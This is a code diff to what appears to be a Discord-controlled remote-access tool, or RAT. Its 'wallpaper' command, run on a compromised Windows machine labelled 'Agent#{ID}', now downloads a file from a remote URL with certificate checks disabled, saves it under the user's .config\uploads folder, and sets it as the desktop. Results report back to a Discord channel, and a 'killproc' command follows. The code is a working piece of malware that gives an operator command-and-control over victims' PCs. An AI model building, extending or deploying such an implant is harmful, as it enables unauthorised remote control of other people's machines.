@@ -512,13 +512,26 @@ async def wallpaper(context):
     command = context.message.content.replace("!wallpaper ", "")
     word_list = command.split()
     wallpaper_path = word_list[1]
-    try:
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
-        my_embed = discord.Embed(title=f"Wallpaper has been set to {wallpaper_path}", color=0x00FF00)
-        await context.message.channel.send(embed=my_embed)
-    except Exception as e:
-        my_embed = discord.Embed(title=f"Error while setting wallpaper on Agent#{ID}:\n{e}", color=0xFF0000)
-        await context.message.channel.send(embed=my_embed)
+    if wallpaper_path.startswith("http"):
+        try:
+            wallpaper_name = f"wallpaper.{wallpaper_path[-3:]}"
+            r = requests.get(wallpaper_path, allow_redirects=True, verify=False)
+            open(fr"C:\Users\{USERNAME}\.config\uploads\{wallpaper_name}", 'wb').write(r.content)
+            wallpaper_location = fr"C:\Users\{USERNAME}\.config\uploads\{wallpaper_name}"
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_location, 0)
+            my_embed = discord.Embed(title=f"Wallpaper has been set to {wallpaper_path}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while setting wallpaper on Agent#{ID}:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+    else:
+        try:
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
+            my_embed = discord.Embed(title=f"Wallpaper has been set to {wallpaper_path}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while setting wallpaper on Agent#{ID}:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
         
 @client.command(name='killproc',pass_context=True)
 async def killproc(context):
